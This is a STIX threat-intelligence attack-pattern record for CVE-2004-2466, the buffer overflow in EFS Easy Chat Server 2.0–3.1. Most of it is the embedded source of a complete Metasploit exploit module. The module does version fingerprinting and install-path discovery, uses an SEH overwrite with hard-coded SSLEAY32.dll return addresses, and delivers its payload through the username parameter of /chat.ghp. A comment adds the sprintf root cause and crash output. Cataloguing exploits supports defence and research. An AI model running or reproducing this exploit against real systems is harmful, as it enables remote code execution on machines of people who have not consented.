{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b12afb6-861c-4059-a485-7e4c28dc3fea",
    "created": "2024-08-14T16:54:20.512454Z",
    "modified": "2024-08-14T16:54:20.512458Z",
    "name": "EFS Easy Chat Server Authentication Request Handling Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in EFS Software Easy Chat Server versions 2.0 to 3.1. By sending an overly long authentication request, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/efs_easychatserver_username.rb",
            "external_id": "efs_easychatserver_username.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-2466"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Easy Chat Server\\/1\\.0/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EFS Easy Chat Server Authentication Request Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in EFS Software Easy Chat\n        Server versions 2.0 to 3.1. By sending an overly long authentication\n        request, an attacker may be able to execute arbitrary code.\n      },\n      'Author'         =>\n        [\n         'LSO <lso[at]hushmail.com>', # original metasploit\n         'bcoles' # metasploit\n        ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE',   '2004-2466' ],\n          [ 'OSVDB', '7416' ],\n          [ 'OSVDB', '106841' ],\n          [ 'BID',   '25328' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 7000,\n          'BadChars' => \"\\x00\\x0a\\x0b\\x0d\\x0f\\x20\\x25\\x26\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested on Easy Chat Server v2.0, 2.1, 2.2, 2.5, 3.1 on:\n          # -- Windows XP SP 3 (x86) (EN)\n          # -- Windows 7  SP 1 (x64) (EN)\n          # -- Windows 8  SP 0 (x64) (EN)\n          [ 'Automatic Targeting', { 'auto' => true } ],\n          # p/p/r SSLEAY32.dll\n          [ 'Easy Chat Server 2.0', { 'Ret' => 0x10010E2E } ],\n          # p/p/r SSLEAY32.dll\n          [ 'Easy Chat Server 2.1 - 3.1', { 'Ret' => 0x1001071E } ]\n        ],\n      'DisclosureDate' => '2007-08-14',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    version = get_version\n    if not version\n      return Exploit::CheckCode::Safe\n    end\n    vprint_status \"Found version: #{version}\"\n    if version !~ /^(2\\.\\d|3\\.0|3\\.1)$/\n      return Exploit::CheckCode::Safe\n    end\n    path = get_install_path\n    if not path\n      return Exploit::CheckCode::Detected\n    end\n    vprint_status \"Found path: #{path}\"\n    return Exploit::CheckCode::Appears\n  end\n\n  #\n  # Get software version from change log\n  #\n  def get_version\n    res = send_request_raw 'uri' => '/whatsnew.txt'\n    if res and res.body =~ /What's new in Easy Chat Server V(\\d\\.\\d)/\n      return \"#{$1}\"\n    end\n  end\n\n  #\n  # Get software installation path from uninstall file\n  #\n  def get_install_path\n    res = send_request_raw 'uri' => '/unins000.dat'\n    if res and res.body =~ /([A-Z]:\\\\[^\\x00]{2,256})?\\\\[a-z]+\\.htm/i\n      return \"#{$1}\"\n    end\n  end\n\n  def exploit\n\n    # get target\n    if target.name =~ /Automatic/\n      version = get_version\n      vprint_status \"Found version: #{version}\" if version\n      if not version or version !~ /^(2\\.\\d|3\\.0|3\\.1)$/\n        fail_with(Failure::NoTarget, \"#{peer} - Unable to automatically detect a target\")\n      elsif version =~ /(2\\.0)/\n        my_target = targets[1]\n      elsif version =~ /(2\\.\\d|3\\.0|3\\.1)/\n        my_target = targets[2]\n      end\n    else\n      my_target = target\n    end\n\n    # get install path\n    path = get_install_path\n    if not path\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not retrieve install path\")\n    end\n    path << \"\\\\users\\\\\"\n    vprint_status \"Using path: #{path}\"\n\n    # send payload\n    sploit = rand_text_alpha(256 - path.length)\n    sploit << generate_seh_payload(my_target.ret)\n    print_status \"Sending request (#{sploit.length} bytes) to target (#{my_target.name})\"\n    send_request_cgi({\n      'uri' => '/chat.ghp',\n      'encode_params' => false,\n      'vars_get' => {\n        'username' => sploit,\n        'password' => rand_text_alphanumeric(rand(10) + 1),\n        'room' => 1,\n        'sex' => rand_text_numeric(1)\n      }\n    }, 5)\n\n  end\nend\n\n=begin\n\n0x004144C8 calls sprintf with the following arguments:\nsprintf(&FileName, \"%susers\\\\%s\", path, username);\n\nSince we can make the username larger than the allocated buffer size\nwe end up overwriting SEH with a PPR from SSLEAY32.dll and nSEH with\na short jmp to the beginning of our shellcode.\n\n(46c.144): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=ffffffff ebx=000007f6 ecx=0047fd50 edx=41414141 esi=000007ef edi=0047a3ea\neip=00445f34 esp=01216b88 ebp=01216ba0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202\nEasyChat+0x45f34:\n00445f34 8a02            mov     al,byte ptr [edx]          ds:0023:41414141=??\n\n0:005> !exchain\n01216dd8: 41414141\nInvalid exception stack at 41414141\n=end\n",
    "x_mitre_disclosure_date": "2007-08-14",
    "x_mitre_platforms": [
        "win'"
    ]
}